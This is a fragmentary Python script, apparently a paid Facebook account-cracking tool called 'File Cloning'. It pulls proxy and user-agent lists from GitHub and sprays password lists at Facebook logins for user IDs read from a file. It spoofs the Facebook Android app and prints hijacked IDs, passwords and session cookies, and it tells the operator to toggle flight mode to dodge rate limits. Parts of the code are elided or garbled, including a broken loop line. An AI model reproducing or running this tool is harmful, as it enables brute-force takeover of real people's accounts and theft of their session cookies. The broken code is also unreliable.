...
# =[•]=[SCRIPT]=[ADMIN]=[AKASH-VAI]=[•]=
#------------------[ Install-1 ]-------------------#
#---[ FUCKED BY - @akasakasddff ]
#---[ FUCKED BY - @akasakasddff ]
#---[ FUCKED BY - @akasakasddff ]
#-----------------[ AKASH ]-------------------# 
...
import urllib3,rich,base64,time
...
ua = ["Dalvik/2.1.0 (Android 7.1.1; L-03K Build/PKQ1.190522.001) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]",]
...
try:
    prox= requests.get('https://github.com/akasonfire/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
    
except Exception as e:
    print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mAKASH')
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/akasonfire/Ua.txt').text
        ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    username = input(' \033[0;92mEnter Username: AKASH')
    password = input(' \033[0;93mEnter Password: 17')
 
    if username == 'AKASH'and password == '17':
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO AKASH-17  FIRE (⚡)
\033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;92m • VERSION [ 6.8] PAID (😻)
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
def login():
    banner()
    print('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
    print('\033[0;97m===============================================')
    AKASH= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
#    if AKASH in ['m']:
#        public()
    if AKASH in ['1']:
        crack_file()
...
def public():
    ...
    for met in range(jum):
        ...
        uid.append(kl)
    for userr in uid:100085482740170')
        try:
...
#    os.system('espeak -a 300 " your file name"')
    print('\033[1;32m [Put File Example:  /sdcard/akash.txt  Etc...]')
...
def passwrd():
    ...
    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 10 MIN")
    print(f'\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r{boo}[👹FIRE👹] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                #AKASH-King
                print(f'\r\033[0;94m[{time.strftime("%H:%M")}•AKASH-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
                ...
                #AKASH-King
                print(f'\r\033[0;932m[AKASH-OK🥰] {idf} • {pw}\n\033[0;93m[😭]= COOKIES • \033[0;932m{kuki} ')
                print('\033[0;94m===============================================')
                os.system('espeak -a 300 " AKASH,  Ok,  id"')
